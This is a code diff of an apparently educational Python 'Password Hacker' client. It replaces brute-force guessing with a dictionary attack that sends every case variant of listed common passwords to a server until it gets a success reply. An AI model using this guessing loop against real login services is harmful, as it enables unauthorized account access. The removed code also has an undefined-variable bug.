@@ -1,9 +1,11 @@
 import socket
 import argparse
-import string
 import itertools
-import time
-psw_list = (list(string.ascii_lowercase) + list(string.digits))
+
+
+filename = "C:\\Users\\KoliaS-PC\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt"
+psw_list = list(item.replace("\n", "") for item in open(filename))
+
 
 argums = argparse.ArgumentParser("ip, port")
 argums.add_argument("ip_address")
@@ -11,30 +13,27 @@ argums.add_argument("port")
 
 str_arg = argums.parse_args()
 
-start_time = time.time()
+psw_item = 0
+
+
+def input_data_check(data):
+    if data == "Connection success!":
+        return True
+    elif data == "Too many attempts":
+        print("Too many attempts")
+        return True
+    return False
+
 
 with socket.socket() as cli_socket:
     cli_socket.connect((str_arg.ip_address, int(str_arg.port)))
-    i = 0
-    n = 1
-    while chr_count < 8:
-        for first in itertools.product(psw_list, repeat=chr_count):
-            if i > len(psw_list) ** chr_count: break
-            cur_psw = "".join(first)
-            cli_socket.send(cur_psw.encode())
-            recv_data = cli_socket.recv(1024).decode()
-            if recv_data == "Connection success!":
-                print(cur_psw)
-                chr_count = 999
+
+    for psw_item in psw_list:
+        for first in map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()]
+                                                                   if letter.isalpha() else [letter]
+                                                                   for letter in psw_item))):
+
+            cli_socket.send("".join(first).encode())
+            if input_data_check(cli_socket.recv(1024).decode()):
+                print(first)  # print found password
                 break
-            elif recv_data == "Too many attempts":
-                print("Too many attempts")
-                chr_count = 999
-                break
-            i += 1
-        chr_count += 1
-
-
-
-
-
